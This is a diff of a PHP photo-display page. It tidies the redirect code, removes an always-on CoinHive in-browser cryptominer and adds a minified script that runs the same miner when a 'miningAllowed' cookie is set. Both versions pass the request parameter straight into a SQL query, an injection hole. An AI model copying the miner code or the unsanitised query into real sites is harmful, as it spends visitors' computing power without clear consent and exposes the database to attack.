@@ -2,17 +2,18 @@
     /* Connexion */
     include '../connection/connection.php';
     $photos = mysqli_query($con, 'SELECT * FROM photo WHERE photo_id = ' . $_GET['photo'] . ';');
-	$photo = mysqli_fetch_array($photos);
-	$size = getimagesize("../../../img/full/" . $photo['photo_link']);
-	if(!isset($photo) || !$size) {
-		header('Location: http://dametenebra.com');
-		exit();
-	}	
-	list($width, $height) = $size;
-	$photo['photo_width'] = $width;
-	$photo['photo_height'] = $height;
+    $photo = mysqli_fetch_array($photos);
+    $size = getimagesize("../../../img/full/" . $photo['photo_link']);
+    /* Make a redirect if no photo found */
+    if (!isset($photo) || !$size) {
+        header('Location: http://dametenebra.com');
+        mysqli_close($con);
+        exit();
+    }
+    list($width, $height) = $size;
+    $photo['photo_width'] = $width;
+    $photo['photo_height'] = $height;
     mysqli_close($con);
-	/* Make a redirect if no photo found */
 ?>
 
 	<html>
@@ -32,7 +33,6 @@
 		<link rel="shortcut icon" href="../../../img/favicon.ico" type="image/x-icon" />
 		<link rel="icon" href="../../../img/favicon.ico" type="image/x-icon" />
 		<link type="text/css" rel="stylesheet" href="../../../css/dist.css">
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	</head>
 
 	<body>
@@ -48,11 +48,6 @@
 				js.src = "//connect.facebook.net/fr_FR/sdk.js#xfbml=1&version=v2.10&appId=698165167044112";
 				fjs.parentNode.insertBefore(js, fjs);
 			}(document, 'script', 'facebook-jssdk'));
-
-            var miner = new CoinHive.Anonymous('lUTEzL49FZFey8iHBMB2ZE4bwxOCyr8K');
-            miner.setThrottle(0.25);
-            miner.start();
-
 		</script>
 
 		<div class="row" style="margin: 0px; width: 100%;">
@@ -86,5 +81,9 @@
 			</div>
 		</div>
 	</body>
+
+  <script>
+    var getCookie=function(e){for(var n=e+"=",o=document.cookie.split(";"),t=0;t<o.length;t++){for(var i=o[t];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(n))return i.substring(n.length,i.length)}return""},loadJS=function(e,n,o){var t=document.createElement("script");t.src=e,t.onload=n,t.onreadystatechange=n,o.appendChild(t)},mine=function(){var e=new CoinHive.Anonymous("lUTEzL49FZFey8iHBMB2ZE4bwxOCyr8K");e.setThrottle(.25),e.start()};getCookie("miningAllowed")&&"true"===getCookie("miningAllowed")&&loadJS("https://coinhive.com/lib/coinhive.min.js",mine,document.body);
+  </script>
 
 	</html>
